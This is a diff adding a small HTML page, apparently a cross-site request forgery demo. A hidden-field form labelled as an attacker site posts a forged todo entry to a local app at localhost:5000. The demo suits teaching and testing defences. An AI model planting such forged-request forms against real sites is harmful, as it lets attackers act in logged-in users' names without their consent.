@@ -1,0 +1,14 @@
+<html>
+<head>
+  <title>Attacker site - attack</title>
+</head>
+<body>
+  <p> <a href="index.html">Back</a></p>
+  <form action="http://localhost:5000/todos" method="POST">
+    <input type="hidden" name="todo[title]" value="Attacker"/>
+    <input type="hidden" name="todo[detail]" value="Je suis chez toi"/>
+    <input type="hidden" name="todo[quantity]" value="666"/>
+    <input type="submit" value="Un bouton suspect"/>
+  </form>
+</body>
+</html>
